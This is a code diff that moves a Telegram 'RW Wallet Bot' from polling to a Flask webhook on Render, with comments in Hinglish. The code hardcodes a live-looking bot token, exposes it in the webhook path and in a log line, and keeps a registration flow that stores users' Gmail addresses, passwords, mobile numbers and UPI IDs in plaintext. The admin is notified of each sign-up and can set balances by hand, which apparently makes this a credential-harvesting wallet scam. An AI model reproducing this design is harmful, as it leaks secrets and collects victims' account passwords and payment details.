@@ -1,6 +1,8 @@
 import logging
 import sqlite3
+import os
 from datetime import datetime
+from flask import Flask, request
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
@@ -9,7 +11,11 @@ logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s
 logger = logging.getLogger(__name__)
 
 TOKEN = "8681941726:AAFll1hp4rZtCHRL_4t-gpgn_frGSZzif5c"
-ADMIN_ID = 5116589075  # <--- Aapki Admin ID seedha yahan set hai
+ADMIN_ID = 5116589075
+
+# Render par aapko apni Web Service ka URL milta hai (jaise: https://your-app-name.onrender.com)
+PORT = int(os.environ.get("PORT", 10000))
+RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL")  # Render khud ye variable deta hai
 
 # --- DATABASE SETUP ---
 def init_db():
@@ -73,7 +79,7 @@ def save_user(user_id, username, fullname, mobile, gmail, password, upi, balance
     conn.commit()
     conn.close()
 
-# --- START & REGISTRATION ---
+# --- BOT HANDLERS ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     user = get_user(user_id)
@@ -122,7 +128,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("✅ **Registration Successful! Wallet Created.**")
         await show_main_menu(update, context)
         
-        # --- ADMIN KO NOTIFICATION BHEJNA ---
         try:
             await context.bot.send_message(
                 chat_id=ADMIN_ID,
@@ -138,11 +143,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 ),
                 parse_mode="Markdown"
             )
-            logger.info(f"Admin notified for user {user_id}")
         except Exception as e:
-            logger.error(f"Failed to send admin notification: {e}")
+            logger.error(f"Admin notify error: {e}")
 
-    # Admin Balance Add Command
     elif user_id == ADMIN_ID and text.startswith("/addrs"):
         try:
             parts = text.split()
@@ -294,16 +297,35 @@ async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         msg += f"👤 ID: `{u[0]}` | @{u[1]}\n📧 {u[2]} | 💰 Rs.{u[3]}\nCommand: `/addrs {u[0]} 50`\n------------------\n"
     await update.message.reply_text(msg, parse_mode="Markdown")
 
-def main():
-    application = Application.builder().token(TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("admin", admin_panel))
-    application.add_handler(CallbackQueryHandler(button_handler))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    
-    logger.info("RW Wallet Bot started successfully...")
-    application.run_polling()
+# --- FLASK WEBHOOK APP ---
+flask_app = Flask(__name__)
+telegram_app = Application.builder().token(TOKEN).build()
+
+telegram_app.add_handler(CommandHandler("start", start))
+telegram_app.add_handler(CommandHandler("admin", admin_panel))
+telegram_app.add_handler(CallbackQueryHandler(button_handler))
+telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+
+@flask_app.route(f"/{TOKEN}", methods=["POST"])
+def webhook():
+    update = Update.de_json(request.get_json(force=True), telegram_app.bot)
+    telegram_app.update_queue.put(update)
+    return "OK"
+
+@flask_app.route("/", methods=["GET"])
+def index():
+    return "RW Wallet Bot is running live via Webhook!"
 
 if __name__ == "__main__":
-    main()
+    import asyncio
+    async def main():
+        await telegram_app.initialize()
+        if RENDER_EXTERNAL_URL:
+            webhook_url = f"{RENDER_EXTERNAL_URL}/{TOKEN}"
+            await telegram_app.bot.set_webhook(url=webhook_url)
+            logger.info(f"Webhook set to: {webhook_url}")
+        await telegram_app.start()
+        flask_app.run(host="0.0.0.0", port=PORT)
+
+    asyncio.run(main())
     
